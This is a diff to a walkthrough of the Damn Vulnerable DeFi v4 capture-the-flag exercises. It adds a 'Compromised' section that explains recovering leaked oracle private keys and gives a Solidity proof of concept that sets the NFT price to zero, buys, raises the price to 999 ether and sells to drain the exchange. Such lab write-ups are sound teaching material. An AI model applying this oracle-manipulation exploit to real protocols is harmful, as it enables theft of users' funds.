@@ -1,4 +1,4 @@
-# Damn Vulnerable DeFi v4 Walkthorugh
+# Damn Vulnerable DeFi v4 Walkthorugh by [JP](https://github.com/CanonicalJP)
 
 ## 1.UNSTOPPABLE
 
@@ -296,3 +296,91 @@ contract Attack is IERC3156FlashBorrower {
 ```
 
 Run `forge test --mc SelfieChallenge` to validate test
+
+---
+
+## 7.COMPROMISED
+
+### Objective
+
+_from `_isSolved()`in test_
+
+1. _Exchange doesn't have ETH anymore_
+2. _ETH was deposited into the recovery account_
+3. _Player must not own any NFT_
+4. _NFT price didn't change_
+
+### Attack Analysis
+
+- The contracts do not present any flaw that could be used to drain the exchange liquidity. Thus, better to start by analysing the leaked data from the server.
+- Because of the context, it's safe to assume that they could potentially be private keys.
+- Let's first ascii decode them using [rapidtables](https://www.rapidtables.com/convert/number/hex-to-ascii.html). Then, let's base64 decode the result using [base64decode](https://www.base64decode.org/).
+- The final result obtained could be a private key. To validate it, let's use [rfctools](https://www.rfctools.com/ethereum-address-test-tool/). Now, we can see that they are private keys to `source[0]` and `source[1]`, both used for price feeds functionalities, see [test/compromised/Compromised.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/b99a51c7056487472824550e0764b4aa390bb4ae/test/compromised/Compromised.t.sol#L24-L28)
+- Having access to the private keys of these sources, and attacker could manipulate the price of the token to buy low and sell high. Effectively draining liquidity from the exchange.
+
+### POC
+
+See [test/compromised/Compromised.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/compromised/Compromised.t.sol)
+
+```solidity
+function test_compromised() public checkSolved {
+    Attack attackExchange = new Attack(oracle, exchange, nft);
+
+    vm.prank(sources[0]);
+    oracle.postPrice(symbols[0], 0);
+    vm.prank(sources[1]);
+    oracle.postPrice(symbols[0], 0);
+
+    attackExchange.buy{value: 1}();
+
+    vm.prank(sources[0]);
+    oracle.postPrice(symbols[0], 999 ether);
+    vm.prank(sources[1]);
+    oracle.postPrice(symbols[0], 999 ether);
+
+    attackExchange.sell();
+    attackExchange.withdraw(recovery, 999 ether);
+}
+
+contract Attack {
+    TrustfulOracle oracle;
+    Exchange exchange;
+    DamnValuableNFT nft;
+    uint nftId;
+
+    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft) {
+        oracle = _oracle;
+        exchange = _exchange;
+        nft = _nft;
+    }
+
+    receive() external payable {}
+
+    function buy() external payable {
+        uint _nftId = exchange.buyOne{value: 1}();
+        nftId = _nftId;
+    }
+
+    function sell() external {
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+
+    function withdraw(address _recovery, uint amount) external {
+        payable(_recovery).transfer(amount);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
+```
+
+Run `forge test --mc CompromisedChallenge` to validate test
+
+---
